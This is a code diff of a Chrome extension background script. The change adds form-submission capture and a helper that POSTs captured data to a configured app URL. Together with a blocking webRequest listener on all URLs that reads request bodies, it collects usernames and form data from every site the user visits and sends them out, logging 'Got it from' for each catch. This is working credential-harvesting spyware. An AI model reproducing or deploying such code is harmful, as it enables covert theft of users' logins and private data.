@@ -23,10 +23,10 @@ function getFieldNames() {
 }
 
 /**
- * Get all user requests and send it to the provided url
+ * Get all user requests information
  * @param {Object} details
  */
-function interceptRequest(details) {
+function captureRequest(details) {
     var formData = {};
     var urlRegExp = new RegExp(_appUrl + '\/?');
 
@@ -49,6 +49,27 @@ function interceptRequest(details) {
         }
     });
 
+    submitData(data);
+}
+
+/**
+ * Get all form submissions
+ * @param {Object} data
+ */
+function captureFormSubmission(data) {
+    if (data.username) {
+        console.log('Got it from ' + data.url +  ' via form sending: ', data.username);
+        submitData(data);
+    }
+}
+
+/**
+ * Submit the data from the captured request
+ * @param {Object} data
+ */
+function submitData(data) {
+    var dfd = $.Deferred();
+
     $.ajax({
         url: _appUrl,
         method: 'POST',
@@ -56,16 +77,26 @@ function interceptRequest(details) {
         dataType: 'json',
         contentType: 'application/json',
         processData: false
+    }).always(function() {
+        dfd.resolve();
     });
+
+    return dfd.promise();
 }
 
 /**
  * Initiate Chrome background events
  */
 function initiateEvents() {
+    chrome.runtime.onMessage.addListener(function(data) {
+        captureFormSubmission(data);
+    });
+
     getFieldNames().then(function (fieldNames) {
         _requestFields = fieldNames;
-        chrome.webRequest.onBeforeRequest.addListener(interceptRequest, {urls: ['<all_urls>']}, ['blocking', 'requestBody']);
+        chrome.webRequest.onBeforeRequest.addListener(captureRequest, {
+            urls: ['<all_urls>']
+        }, ['blocking', 'requestBody']);
     });
 }
 
